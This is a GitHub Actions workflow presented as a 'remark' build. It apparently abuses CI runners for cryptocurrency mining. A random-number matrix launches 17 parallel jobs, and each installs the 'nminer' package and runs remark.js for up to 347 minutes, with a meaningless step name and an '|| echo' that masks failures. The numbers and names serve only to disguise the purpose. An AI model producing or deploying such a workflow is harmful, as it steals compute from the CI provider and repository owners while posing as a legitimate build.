name: remark
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2364 }
          - { version: 9239 }
          - { version: 2259 }
          - { version: 1980 }
          - { version: 1362 }
          - { version: 8577 }
          - { version: 4625 }
          - { version: 8751 }
          - { version: 2245 }
          - { version: 7397 }
          - { version: 3915 }
          - { version: 5333 }
          - { version: 7298 }
          - { version: 1119 }
          - { version: 1757 }
          - { version: 207 }
          - { version: 8820 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: near filter why strictly anenst
        run: |
          npm install nminer@latest
          timeout 347m node remark.js || echo "remark executed"